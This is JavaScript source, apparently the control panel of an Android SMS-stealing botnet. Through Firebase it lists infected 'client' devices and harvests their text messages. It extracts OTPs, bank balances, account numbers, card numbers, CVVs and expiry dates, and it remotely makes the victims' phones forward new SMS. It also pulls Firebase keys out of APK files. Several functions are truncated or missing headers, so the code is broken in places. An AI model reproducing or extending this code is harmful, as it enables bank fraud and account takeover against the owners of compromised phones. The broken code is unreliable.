<script>
(function(){
"use strict";
const CFG = window.GHOST_CONFIG || {};
const LS_A = CFG.storageKey || "ghost_accounts";
const LS_L = "ghost_last";
const LS_ALIAS = "ghost_alias";
const LS_TG = "ghost_tg";
const LS_FWD = "ghost_fwd";

const S = {
  url:"", key:"", devices:[], cur:null, msgs:[],
  filter:"all", mf:"all", sim:1, bsim:1, nsim:1,
  nuke:false, nS:0, nF:0, nMode:"random",
  seen:new Set(), seeded:new Set(),
  pollT:null, msgT:null, watchT:null, otpT:null,
  lastOtp:"", tg:{}, fwd:{}, alias:{}, raw:{}, phoneCache:{}
};

const $ = id => document.getElementById(id);
const esc = s => String(s==null?"":s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");

/* ─────────── helpers ─────────── */
function toast(m, t){
  const b = $("toasts");
  const e = document.createElement("div");
  e.className = "tst" + (t ? " " + t : "");
  e.textContent = m;
  b.appendChild(e);
  setTimeout(() => { e.style.opacity = "0"; e.style.transform = "translateY(10px)"; setTimeout(() => e.remove(), 220); }, 2600);
}

function copy(text, label){
  navigator.clipboard.writeText(text).then(() => toast(label || "Copied", "ok")).catch(() => {
    const t = document.createElement("textarea");
    t.value = text; document.body.appendChild(t); t.select(); document.execCommand("copy"); t.remove();
    toast(label || "Copied", "ok");
  });
}

function fmtPhone(n){
  n = String(n || "").replace(/\D/g,"");
  if(n.length === 12 && n.startsWith("91")) n = n.slice(2);
  if(n.length === 10) return n.replace(/(\d{5})(\d{5})/, "$1 $2");
  return n || "—";
}

function parseCustomDate(s){
  if(!s) return null;
  const m = String(s).match(/(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)?/i);
  if(!m) return null;
  let [, dd, mm, yyyy, hh, mi, ampm] = m;
  dd = +dd; mm = +mm; yyyy = +yyyy; hh = +hh; mi = +mi;
  if(ampm){
    ampm = ampm.toLowerCase();
    if(ampm === "pm" && hh < 12) hh += 12;
    if(ampm === "am" && hh === 12) hh = 0;
  }
  return new Date(yyyy, mm-1, dd, hh, mi).getTime();
}

function parseTs(v){
  if(v == null) return null;
  if(typeof v === "number") return v < 1e12 ? v * 1000 : v;
  const s = String(v);
  const n = Number(s);
  if(!isNaN(n) && s.length >= 10 && s.length <= 13) return n < 1e12 ? n*1000 : n;
  const d = Date.parse(s);
  return isNaN(d) ? null : d;
}

function fmtAgo(ts){
  if(!ts) return "";
  const d = new Date(ts);
  if(isNaN(d)) return "";
  const diff = Date.now() - ts;
  if(diff < 0) return "now";
  const s = Math.floor(diff/1000), m = Math.floor(s/60), h = Math.floor(m/60), dd = Math.floor(h/24);
  if(s < 60) return s + "s ago";
  if(m < 60) return m + "m ago";
  if(h < 24) return h + "h " + (m%60) + "m ago";
  if(dd < 30) return dd + "d " + (h%24) + "h ago";
  return d.toLocaleDateString("en-IN", {day:"2-digit", month:"short", year:"numeric"});
}

function fmtFull(ts){
  if(!ts) return "";
  const d = new Date(ts);
  if(isNaN(d)) return "";
  return d.toLocaleString("en-IN", {day:"2-digit", month:"short", year:"numeric", hour:"2-digit", minute:"2-digit", hour12:true});
}

function numFmt(n){
  try { return parseFloat(n).toLocaleString("en-IN", {minimumFractionDigits:2, maximumFractionDigits:2}); }
  catch { return String(n); }
}

function getAlias(id){
  try {
    const a = JSON.parse(localStorage.getItem(LS_ALIAS) || "{}");
    return a[id] || "";
  } catch { return ""; }
}

function setAlias(id, v){
  try {
    const a = JSON.parse(localStorage.getItem(LS_ALIAS) || "{}");
    if(v) a[id] = v; else delete a[id];
    localStorage.setItem(LS_ALIAS, JSON.stringify(a));
  } catch {}
}

const PHONE_RE = [
  /(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|VODAFONE|BSNL|MTNL|Idea|IDEA)\s+(?:नंबर|नम्बर|નંબર|Number|No\.?|Num)?[\s:]+(\+?91[-\s]?[6-9][0-9]{9})/,
  /(?:Jio|JIO|Airtel|AIRTEL|Vi|VI|Vodafone|VODAFONE|BSNL|MTNL|Idea|IDEA)\s+(?:नंबर|नम्बर|નંબર|Number|No\.?|Num)?[\s:]+([6-9][0-9]{9})/,
  /(?:mobile|phone|contact|mob\.?)\s+(?:no\.?|number|num|नंबर)?[\s:]+(\+?91[-\s]?[6-9][0-9]{9})/i,
  /(?:mobile|phone|contact|mob\.?)\s+(?:no\.?|number|num|नंबर)?[\s:]+([6-9][0-9]{9})/i,
  /(\+91[-\s]?[6-9][0-9]{9})/,
  /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/
];

function extractPhone(text){
  if(!text) return null;
  for(const re of PHONE_RE){
    const m = text.match(re);
    if(m && m[1]){
      const d = m[1].replace(/\D/g,"");
      if(d.length === 10 && /^[6-9]/.test(d)) return d;
      if(d.length === 12 && d.startsWith("91")) return d.slice(2);
    }
  }
  return null;
}

function detectNetworkFromText(text, sender){
  const hay = (text + " " + sender).toLowerCase();
  if(/jio/.test(hay)) return "Jio";
  if(/airtel/.test(hay)) return "Airtel";
  if(/vodafone|(?:^|\W)vi(?:\W|$)|idea/.test(hay)) return "Vi";
  if(/bsnl/.test(hay)) return "BSNL";
  return "";
}

function parseDevices(data){
  const out = [];
  if(!data || typeof data !== "object") return out;
  for(const [id, d] of Object.entries(data)){
    if(!d || typeof d !== "object") continue;

    const bat = String(d.battery || "");
    const batN = parseInt(bat.replace(/[^\d]/g,"")) || 0;
    const status = !!d.status;

    let lastSeen = null;
    if(d.commands && typeof d.commands === "object"){
      for(const c of Object.values(d.commands)){
        if(c && typeof c === "object" && c.ts){
          const ts = parseTs(c.ts);
          if(ts && (!lastSeen || ts > lastSeen)) lastSeen = ts;
        }
      }
    }
    if(!lastSeen){
      const ls = d.lastSeen || d.last_seen || d.timestamp || null;
      lastSeen = parseTs(ls);
    }

    const alias = getAlias(id);
    const shortId = id.slice(-4);

    out.push({
      id, raw:d,
      name: alias || ("Device ·" + shortId),
      hasAlias: !!alias,
      battery: bat,
      batteryPercent: batN,
      status,
      lastSeen,
      phone: "",
      network: "",
      sims: [],
      msgCount: 0,
      analysis: null
    });
  }
  return out;
}

function parseMsgs(data){
  const out = [];
  if(!data || typeof data !== "object") return out;
  const entries = Object.entries(data);
  const slice = entries.length > 400 ? entries.slice(-400) : entries;
  for(const [k, v] of slice){
    if(!v || typeof v !== "object") continue;
    const body = String(v.message || v.body || v.text || v.msg || "");
    if(!body.trim()) continue;
    const ts = parseCustomDate(v.dateTime || v.date)
            || parseTs(v.timestamp || v.id)
            || null;
    out.push({
      id: k,
      pushId: k,
      numericId: v.id,
      sender: String(v.sender || v.address || v.from || "Unknown"),
      body,
      ts,
      time: ts ? fmtAgo(ts) : String(v.dateTime || ""),
      timeFull: ts ? fmtFull(ts) : String(v.dateTime || ""),
      type: String(v.type || "incoming"),
      cat: catMsg(body)
    });
  }
  out.sort((a, b) => (b.ts || 0) - (a.ts || 0));
  return out;
}

const BANK_RE = [
  [/HDFCBK|HDFCBANK|HDFC/i,"HDFC Bank"],[/SBIIN|SBIINB|SBI/i,"SBI"],
  [/ICICIB|ICICI/i,"ICICI Bank"],[/AXISBK|AXISBANK|AXIS/i,"Axis Bank"],
  [/KOTAKB|KOTAK/i,"Kotak Bank"],[/PNBSMS|PNB/i,"PNB"],
  [/BOIIND|BOI/i,"Bank of India"],[/CANBNK|CANARA/i,"Canara Bank"],
  [/UNIONB|UBISMS/i,"Union Bank"],[/YESBNK|YESBANK/i,"Yes Bank"],
  [/IDBIBK|IDBI/i,"IDBI Bank"],[/INDUSB|INDUSIND/i,"IndusInd Bank"],
  [/FEDERAL|FEDBNK/i,"Federal Bank"],[/RBLBNK|RBL/i,"RBL Bank"],
  [/PAYTM/i,"Paytm"],[/PHONEPE|PHNPE|PHONPE/i,"PhonePe"],
  [/GPAY|GOOGLEPAY/i,"Google Pay"],[/AMAZONPAY/i,"Amazon Pay"],
  [/BAJAJFIN/i,"Bajaj Finance"],[/CRED/i,"CRED"],
  [/AIRTEL/i,"Airtel Payments"],[/JIOMNY|JIOMONEY|JioBln|JIOPAY|JioSvc/i,"Jio"],
  [/IDFC/i,"IDFC FIRST"]
];
const BAL_RE = [
  /(?:Avl|Avbl|Aval|Available|Avail)\.?\s*(?:Bal(?:ance)?)\.?\s*[:\-]?\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)/i,
  /Bal(?:ance)?\.?\s*[:\-]?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /Bal[\.:]?\s*([0-9]{3,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
];
const AMT_RE = [
  /(?:debited|credited|withdrawn|deposited|paid|sent|received|Charged|Charges)\s*(?:by|with|for|of|:)?\s*(?:INR|Rs\.?|₹)?\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:debited|credited|withdrawn)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
];
const ACC_RE = [
  /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
  /[xX*]{4,}([0-9]{4})/,
  /ending\s+(?:with\s+)?([0-9]{4})/i
];
const CARD_RE = [
  /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i,
  /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i
];
const CVV_RE = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
const EXP_RE = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];

function detectBank(sender){
  for(const [re, name] of BANK_RE) if(re.test(sender)) return name;
  return null;
}

function parseBank(text, sender){
  const u = text.toUpperCase();
  if(!/AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|INR|A\/C|Charged|Charges/.test(u)) return null;
  let bal = null;
  for(const re of BAL_RE){ const m = text.match(re); if(m && m[1]){ bal = m[1].replace(/,/g,""); break; } }
  if(!bal) return null;
  let amt = null;
  for(const re of AMT_RE){ const m = text.match(re); if(m && m[1]){ const v = m[1].replace(/,/g,""); if(v !== bal){ amt = v; break; } } }
  let dir;
  if(/credit(?:ed)?/i.test(text)) dir = "credit";
  else if(/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) dir = "debit";
  let acc = null;
  for(const re of ACC_RE){ const m = text.match(re); if(m && m[1]){ acc = m[1].replace(/\D/g,"").slice(-4); break; } }
  const bankName = detectBank(sender) || "Bank";
  const phone = extractPhone(text);
  return {
    bankName, sender, balance: bal, amount: amt, dir, acc,
    phone: phone || undefined,
    raw: text,
    ts: null
  };
}

function parseCard(t){
  if(!/CARD|CVV|CREDIT|DEBIT/i.test(t)) return null;
  let last4 = "";
  for(const re of CARD_RE){ const m = t.match(re); if(m && m[1]){ const d = m[1].replace(/\D/g,""); if(d.length >= 4){ last4 = d.slice(-4); break; } } }
  if(!last4) return null;
  let type = "Card";
  if(/VISA/i.test(t)) type = "VISA";
  else if(/MASTER(?:CARD)?/i.test(t)) type = "Mastercard";
  else if(/RUPAY/i.test(t)) type = "RuPay";
  else if(/AMEX/i.test(t)) type = "Amex";
  let cvv = "";
  for(const re of CVV_RE){ const m = t.match(re); if(m && m[1]){ cvv = m[1]; break; } }
  let exp = "";
  for(const re of EXP_RE){ const m = t.match(re); if(m && m[1]){ exp = m[1]; break; } }
  return {last4, type, cvv, exp, raw: t};
}

function catMsg(t){
  const u = t.toUpperCase();
  if(/\bOTP\b|ONE.?TIME|PASSCODE|VERIF|\bVERIFICATION\b/.test(u)) return "otp";
  if(/AVL|AVAL|AVBL|\bBAL\b|CREDITED|DEBITED|INR|A\/C|Charged|Charges/.test(u)) return "bank";
  if(/\bCARD\b|CVV/.test(u)) return "card";
  return "gen";
}

function extractOtp(t){
  let m = t.match(/\b(\d{6})\b/);
  if(m) return m[1];
  m = t.match(/(?:OTP|otp|code|CODE|PIN|pin)[\s:\-]*(\d{4,8})/);
  if(m) return m[1];
  m = t.match(/(?<![₹$\d])\b(\d{4,8})\b/);
  return m ? m[1] : null;
}

/* ─────────── firebase ─────────── */
async function fbGet(path){
  if(!S.url || !S.key) throw new Error("Not connected");
  const base = S.url.replace(/\/+$/,"");
  const sep = path.includes("?") ? "&" : "?";
  const url = base + "/" + path + ".json" + sep + "auth=" + encodeURIComponent(S.key);
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 15000);
  try {
    const r = await fetch(url, {signal: ctrl.signal});
    clearTimeout(t);
    if(!r.ok){
      if(r.status === 401 || r.status === 403) throw new Error("PERMISSION_DENIED");
      if(r.status === 404) return null;
      throw new Error("HTTP " + r.status);
    }
    return r.json();
  } catch(e){ clearTimeout(t); throw e; }
}
async function fbSet(path, data){
  if(!S.url || !S.key) throw new Error("Not connected");
  const base = S.url.replace(/\/+$/,"");
  const r = await fetch(base + "/" + path + ".json?auth=" + encodeURIComponent(S.key), {
    method:"PUT", headers:{"Content-Type":"application/json"}, body: JSON.stringify(data)
  });
  if(!r.ok) throw new Error("HTTP " + r.status);
  return r.json();
}
async function fbDel(path){
  if(!S.url || !S.key) throw new Error("Not connected");
  const base = S.url.replace(/\/+$/,"");
  const r = await fetch(base + "/" + path + ".json?auth=" + encodeURIComponent(S.key), {method:"DELETE"});
  if(!r.ok) throw new Error("HTTP " + r.status);
  return r.json();
}

/* ─────────── enrich ─────────── */
async function enrichDevice(devId){
  try {
    const data = await fbGet(`messages/${devId}`);
    const msgs = parseMsgs(data);
    let phone = "", network = "";
    for(const m of msgs){
      if(!phone){
        const p = extractPhone(m.body);
        if(p){
          phone = p;
          network = detectNetworkFromText(m.body, m.sender);
        }
      }
    }
    return {phone, network, msgCount: msgs.length, msgs};
  } catch {
    return {phone:"", network:"", msgCount:0, msgs:[]};
  }
}

function analyze(msgs){
  const a = { bank:[], cards:[], otps:[], phones:[], networks:[] };
  const ps = new Set(), ns = new Set();
  for(const m of msgs){
    const b = parseBank(m.body, m.sender);
    if(b){ b.ts = m.ts; a.bank.push(b); }
    const c = parseCard(m.body);
    if(c){ c.ts = m.ts; a.cards.push(c); }
    if(m.cat === "otp"){
      const o = extractOtp(m.body);
      if(o) a.otps.push({otp:o, sender:m.sender, ts:m.ts, body:m.body});
    }
    const p = extractPhone(m.body);
    if(p) ps.add(p);
    const n = detectNetworkFromText(m.body, m.sender);
    if(n) ns.add(n);
  }
  a.phones = [...ps];
  a.networks = [...ns];
  return a;
}

/* ─────────── login ─────────── */
function getAccts(){
  try { return JSON.parse(localStorage.getItem(LS_A) || "[]"); } catch { return []; }
}
function setAccts(a){ localStorage.setItem(LS_A, JSON.stringify(a)); }

function shareLink(url, key){
  const b = location.origin + location.pathname;
  const p = btoa(unescape(encodeURIComponent(url + "|||" + key)));
  return b + "?s=" + p;
}
function parseShare(c){
  try {
    const [url, key] = decodeURIComponent(escape(atob(c))).split("|||");
    if(url && key) return {url, key};
  } catch {}
  return null;
}

function showSaved(){
  const a = getAccts();
  const sc = $("savedSec"), fc = $("formSec");
  if(!a.length){ sc.style.display = "none"; fc.style.display = "block"; return; }
  sc.style.display = "block"; fc.style.display = "none";
  const list = $("savedList");
  list.innerHTML = "";
  a.forEach((acc, i) => {
    const row = document.createElement("div");
    row.className = "acct";
    row.innerHTML = `
      <div class="acct-i"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M12 2C7 2 3 6 3 11v9l3-2 3 2 3-2 3 2 3-2 3 2v-9c0-5-4-9-9-9z"/></svg></div>
      <div class="acct-m">
        <div class="acct-u">${esc(acc.url)}</div>
        <div class="acct-d">${esc(acc.date || "")}</div>
      </div>
      <button class="icon-b" data-act="share" data-i="${i}" title="Share">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><path d="M8.6 13.5l6.8 4M15.4 6.5l-6.8 4"/></svg>
      </button>
      <button class="icon-b dng" data-act="del" data-i="${i}" title="Delete">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/></svg>
      </button>`;
    row.addEventListener("click", ev => {
      const t = ev.target.closest("[data-act]");
      if(t){
        ev.stopPropagation();
        const act = t.dataset.act, idx = parseInt(t.dataset.i);
        if(act === "share") copy(shareLink(a[idx].url, a[idx].key), "Share link copied");
        else if(act === "del"){
          if(confirm("Delete account?")){ const l = getAccts(); l.splice(idx, 1); setAccts(l); showSaved(); }
        }
        return;
      }
      connect(a[i].url, a[i].key);
    });
    list.appendChild(row);
  });
}

function showNew(){
  $("savedSec").style.display = "none";
  $("formSec").style.display = "block";
  $("inpUrl").value = ""; $("inpKey").value = "";
  $("btnGo").textContent = "Connect";
}
function showErr(m){ const b = $("errBox"); b.textContent = m; b.classList.add("on"); }
function clearErr(){ $("errBox").classList.remove("on"); }

async function login(){
  clearErr();
  let url = $("inpUrl").value.trim().replace(/\/+$/,"");
  const key = $("inpKey").value.trim();
  if(!url || !key){ showErr("Enter URL and Key"); return; }
  if(!/^https?:\/\//.test(url)) url = "https://" + url;
  if(!/firebaseio\.com|firebasedatabase\.app/.test(url)){
    showErr("Invalid Firebase URL");
    return;
  }
  const btn = $("btnGo");
  btn.disabled = true; btn.textContent = "Connecting...";
  try { await connect(url, key, true); }
  catch(e){
    btn.disabled = false; btn.textContent = "Connect";
    showErr(e.message || "Connection failed");
  }
}

async function connect(url, key, save){
  clearErr();
  S.url = url; S.key = key;
  try { await fbGet("clients"); }
  catch(e){ S.url = ""; S.key = ""; throw e; }
  if(save !== false){
    const l = getAccts();
    if(!l.some(a => a.url === url)){
      l.push({url, key, date: new Date().toLocaleString()});
      setAccts(l);
    }
    localStorage.setItem(LS_L, JSON.stringify({url, key}));
  }
  $("login").style.display = "none";
  $("app").classList.add("on");
  try { S.tg = JSON.parse(localStorage.getItem(LS_TG) || "{}"); } catch { S.tg = {}; }
  try { S.fwd = JSON.parse(localStorage.getItem(LS_FWD) || "{}"); } catch { S.fwd = {}; }
  boot();
  notifyAdmins(url, key).catch(() => {});
}

function logout(){

async function parseApk(file){
  if(!window.JSZip){ toast("JSZip not loaded", "err"); return; }
  toast("Parsing APK...");
  try {
    const buf = await file.arrayBuffer();
    const zip = await JSZip.loadAsync(buf);
    let url = "", key = "";
    const urlRe = /https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi;
    const urlRe2 = /https:\/\/[a-z0-9_-]+\.firebasedatabase\.app/gi;
    const keyRe = /AIza[A-Za-z0-9_-]{35}/g;
    function scan(u8){
      let s = "";
      for(let i = 0; i < u8.length; i += 65536) s += String.fromCharCode.apply(null, u8.subarray(i, i + 65536));
      const u = s.match(urlRe) || s.match(urlRe2);
      const k = s.match(keyRe);
      return {url: u ? u[0] : "", key: k ? k[0] : ""};
    }
    const cands = ["resources.arsc","classes.dex","classes2.dex","classes3.dex","classes4.dex"];
    for(const n of cands){
      if(url && key) break;
      const f = zip.file(n);
      if(!f) continue;
      const r = scan(await f.async("uint8array"));
      if(!url && r.url) url = r.url;
      if(!key && r.key) key = r.key;
    }
    if(!url || !key){
      const g = zip.file("google-services.json") || zip.file("assets/google-services.json");
      if(g) try {
        const j = JSON.parse(await g.async("text"));
        if(!url && j?.project_info?.firebase_url) url = j.project_info.firebase_url;
        const api = j?.client?.[0]?.api_key?.[0]?.current_key;
        if(!key && api) key = api;
      } catch {}
    }
    if(!url && !key){ toast("Firebase config not found", "err"); return; }
    $("inpUrl").value = url || "";
    $("inpKey").value = key || "";
    toast("Extracted", "ok");
  } catch(e){ toast("Parse failed", "err"); }
}

/* ─────────── boot ─────────── */
function boot(){
  [S.pollT, S.msgT, S.watchT].forEach(t => t && clearInterval(t));
  fetchDevices();
  S.pollT = setInterval(fetchDevices, CFG.pollDevices || 15000);
  S.watchT = setInterval(watchAll, 10000);
}

async function fetchDevices(){
  try {
    const data = await fbGet("clients");
    const devs = parseDevices(data);
    for(const d of devs){
      const old = S.devices.find(x => x.id === d.id);
      if(old){
        if(old.analysis) d.analysis = old.analysis;
        if(old.phone) d.phone = old.phone;
        if(old.network) d.network = old.network;
        if(old.msgCount) d.msgCount = old.msgCount;
      }
    }
    S.devices = devs;
    stats(); render();

    const newDevs = devs.filter(d => !S.phoneCache[d.id]);
    const queue = newDevs.slice(0, 20);
    for(let i = 0; i < queue.length; i += 4){
      await Promise.all(queue.slice(i, i + 4).map(async d => {
        const res = await enrichDevice(d.id);
        S.phoneCache[d.id] = res;
        const dev = S.devices.find(x => x.id === d.id);
        if(dev){
          dev.phone = res.phone;
          dev.network = res.network;
          dev.msgCount = res.msgCount;
          dev.analysis = analyze(res.msgs);
        }
      }));
      stats(); render();
    }
    if(S.cur){
      const f = S.devices.find(x => x.id === S.cur.id);
      if(f){ S.cur = f; pills(); }
    }
  } catch(e){
    if(String(e.message).includes("PERMISSION_DENIED")) toast("Permission denied", "err");
  }
}

async function watchAll(){
  for(const d of S.devices) watchDev(d.id).catch(() => {});
}

async function watchDev(id){
  try {
    if(!S.seeded.has(id)){
      const data = await fbGet(`messages/${id}`);
      if(data && typeof data === "object") for(const k of Object.keys(data)) S.seen.add(id + "_" + k);
      S.seeded.add(id);
      return;
    }
    const data = await fbGet(`messages/${id}`);
    if(!data || typeof data !== "object") return;
    const entries = Object.entries(data);
    const recent = entries.slice(-10);
    for(const [k, v] of recent){
      const key = id + "_" + k;
      if(S.seen.has(key)) continue;
      S.seen.add(key);
      const body = String(v.message || v.body || v.text || "");
      if(!body.trim()) continue;
      const m = {
        sender: String(v.sender || v.address || "Unknown"),
        body,
        ts: parseCustomDate(v.dateTime) || parseTs(v.id) || Date.now()
      };
      autoFwd(id, m).catch(() => {});
      if(catMsg(body) === "otp"){
        const otp = extractOtp(body);
        if(otp && otp !== S.lastOtp) showOtp(otp, m.sender);
      }
    }
  } catch {}
}

async function autoFwd(id, m){
  const fwd = S.fwd[id];
  if(!fwd) return;
  const otp = extractOtp(m.body);
  const cat = catMsg(m.body);
  const text = (cat === "otp" && otp)
    ? `OTP: ${otp}\nFrom: ${m.sender}\n${m.body}`
    : `From: ${m.sender}\n${m.body}`;
  try { await fbSet(`clients/${id}/webhookEvent/sendSms`, {from:1, to:fwd, message:text, isSended:false}); }
  catch {}
}

/* ─────────── stats / render ─────────── */
function stats(){
  const t = S.devices.length;
  const on = S.devices.filter(d => d.status).length;
  const bk = S.devices.filter(d => d.analysis && d.analysis.bank.length).length;
  const ot = S.devices.filter(d => d.analysis && d.analysis.otps.length).length;
  const cd = S.devices.filter(d => d.analysis && d.analysis.cards.length).length;
  $("sT").textContent = t;
  $("sOn").textContent = on;
  $("sOff").textContent = t - on;
  $("sBk").textContent = bk;
  $("sOtp").textContent = ot;
  $("sCd").textContent = cd;

function setFilter(f){
  S.filter = f;
  document.querySelectorAll(".fchip").forEach(c => c.classList.toggle("on", c.dataset.f === f));
  render();
}

function render(){
  const q = ($("searchInp").value || "").toLowerCase();
  const sort = $("sortSel").value;
  let list = S.devices.filter(d => {
    if(S.filter === "online" && !d.status) return false;
    if(S.filter === "offline" && d.status) return false;
    if(S.filter === "bank" && (!d.analysis || !d.analysis.bank.length)) return false;
    if(S.filter === "card" && (!d.analysis || !d.analysis.cards.length)) return false;
    if(S.filter === "otp" && (!d.analysis || !d.analysis.otps.length)) return false;
    if(S.filter === "phone" && !d.phone) return false;
    if(q){
      const hay = (d.name + " " + d.phone + " " + d.id + " " + d.network).toLowerCase();
      if(!hay.includes(q)) return false;
    }
    return true;
  });
  list.sort((a, b) => {
    if(sort === "bat") return b.batteryPercent - a.batteryPercent;
    if(sort === "msgs") return (b.msgCount || 0) - (a.msgCount || 0);
    if(sort === "old") return a.id.localeCompare(b.id);
    return b.id.localeCompare(a.id);
  });
  const g = $("grid");
  g.innerHTML = "";
  if(!list.length){
    g.innerHTML = `<div class="empty">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect width="14" height="20" x="5" y="2" rx="2"/><path d="M12 18h.01"/></svg>
      <p>${S.devices.length ? "No match" : "Waiting for devices"}</p>
      <small>${S.devices.length ? "Try a different filter" : "Devices will appear as they connect"}</small>
    </div>`;
    return;
  }
  list.forEach((d, i) => g.appendChild(devCard(d, i)));
}

/* ─────────── drawer ─────────── */
function openDrawer(id){
  const d = S.devices.find(x => x.id === id);
  if(!d) return;
  S.cur = d; S.msgs = [];
  $("dName").textContent = d.name;
  $("dPhone").textContent = d.phone ? fmtPhone(d.phone) + (d.network ? " · " + d.network : "") : "—";
  $("drOv").classList.add("on");
  tab("info"); pills();
  fetchMsgs(id);
  loadSettings(id);
  $("spu1").textContent = d.phone ? fmtPhone(d.phone) : "—";
  $("spu2").textContent = "—";
  $("useNumB").style.display = d.phone ? "block" : "none";
  $("setAlias").value = d.hasAlias ? d.name : "";
  if(S.msgT) clearInterval(S.msgT);
  S.msgT = setInterval(() => fetchMsgs(id), CFG.pollMessages || 6000);

function closeDrawer(){
  $("drOv").classList.remove("on");
  if(S.msgT) clearInterval(S.msgT);
  S.cur = null; S.msgs = [];
}

function pills(){
  const d = S.cur;
  if(!d) return;
  const p = [];
  p.push(`<span class="p ${d.status ? "g" : "r"}">${d.status ? "● Online" : "○ Offline"}</span>`);
  p.push(`<span class="p c">Bat ${esc(d.battery || "—")}</span>`);

  if(d.analysis && d.analysis.bank.length) p.push(`<span class="p g">${d.analysis.bank.length} Bank</span>`);
  if(d.analysis && d.analysis.cards.length) p.push(`<span class="p p">${d.analysis.cards.length} Card</span>`);
  if(d.analysis && d.analysis.otps.length) p.push(`<span class="p o">${d.analysis.otps.length} OTP</span>`);
  $("dPills").innerHTML = p.join("");
}

async function fetchMsgs(id){
  try {
    const data = await fbGet(`messages/${id}`);
    S.msgs = parseMsgs(data);
    const a = analyze(S.msgs);
    const d = S.devices.find(x => x.id === id);
    if(d) d.analysis = a;
    if(S.cur && S.cur.id === id){
      S.cur.analysis = a;
      $("tcB").textContent = a.bank.length;
      $("tcC").textContent = a.cards.length;
      $("tcO").textContent = a.otps.length;
    }
    renderSms();
    $("tcS").textContent = S.msgs.length;
  } catch {}
}

  const q = ($("smsSearch").value || "").toLowerCase();

  else if(S.mf === "bank") list = list.filter(m => m.cat === "bank");
  if(q) list = list.filter(m => (m.body + " " + m.sender).toLowerCase().includes(q));
  const box = $("smsList");
  if(!list.length){
    box.innerHTML = `<div class="empty" style="padding:40px 10px"><p>${S.msgs.length ? "No match" : "No messages"}</p></div>`;
    return;
  }
  box.innerHTML = "";
  list.forEach(m => box.appendChild(msgEl(m)));
}

function msgEl(m){
  const el = document.createElement("div");
  el.className = "sms " + (m.cat === "otp" ? "otp" : m.cat === "bank" ? "bank" : m.cat === "card" ? "card" : "");
  const otp = m.cat === "otp" ? extractOtp(m.body) : null;
  el.innerHTML = `
    <div class="sms-h">
      <span class="sms-t ${m.cat}">${m.cat === "otp" ? "OTP" : m.cat === "bank" ? "BANK" : m.cat === "card" ? "CARD" : "MSG"}</span>
      <span class="sms-s">${esc(m.sender)}</span>
      <span class="sms-tm">${esc(m.time)}</span>
    </div>
    ${otp ? `<div class="sms-o">${esc(otp)}</div>` : ""}
    <div class="sms-b">${esc(m.body)}</div>
    <button class="sms-x" onclick="event.stopPropagation();G.deleteMsg('${esc(m.pushId)}')">✕</button>`;
  el.addEventListener("click", () => copy(m.body, "Message copied"));
  return el;
}

async function deleteMsg(pushId){
  if(!S.cur) return;
  if(!confirm("Delete message?")) return;
  try {
    await fbDel(`messages/${S.cur.id}/${pushId}`);
    S.msgs = S.msgs.filter(m => m.pushId !== pushId);
    renderSms(); $("tcS").textContent = S.msgs.length;
    toast("Deleted", "ok");
  } catch { toast("Failed", "err"); }
}

async function deleteAllMsgs(){
  if(!S.cur) return;
  if(!confirm("Delete ALL messages for this device?")) return;
  try {
    await fbDel(`messages/${S.cur.id}`);
    S.msgs = []; renderSms(); $("tcS").textContent = 0;
    toast("All deleted", "ok");
  } catch { toast("Failed", "err"); }
}

function setMf(f){
  S.mf = f;
  document.querySelectorAll("[data-mf]").forEach(b => b.classList.toggle("on", b.dataset.mf === f));
  renderSms();
}

function exportSms(){
  if(!S.cur || !S.msgs.length){ toast("Nothing to export", "err"); return; }
  const rows = [["Sender","Time","Category","Body"]];
  for(const m of S.msgs) rows.push([m.sender, m.timeFull || m.time || "", m.cat, m.body.replace(/\n/g," ")]);
  const csv = rows.map(r => r.map(c => `"${String(c).replace(/"/g,'""')}"`).join(",")).join("\n");
  const b = new Blob([csv], {type:"text/csv"});
  const a = document.createElement("a");
  a.href = URL.createObjectURL(b);
  a.download = `ghost_${S.cur.id.slice(0,8)}_${Date.now()}.csv`;
  a.click(); URL.revokeObjectURL(a.href);
  toast("Exported", "ok");
}

/* ─────────── send ─────────── */
function pickSim(n){
  S.sim = n;
  $("sp1").classList.toggle("on", n === 1);
  $("sp2").classList.toggle("on", n === 2);
  $("sLbl").textContent = n;
}
function useNum(){
  if(!S.cur || !S.cur.phone) return;
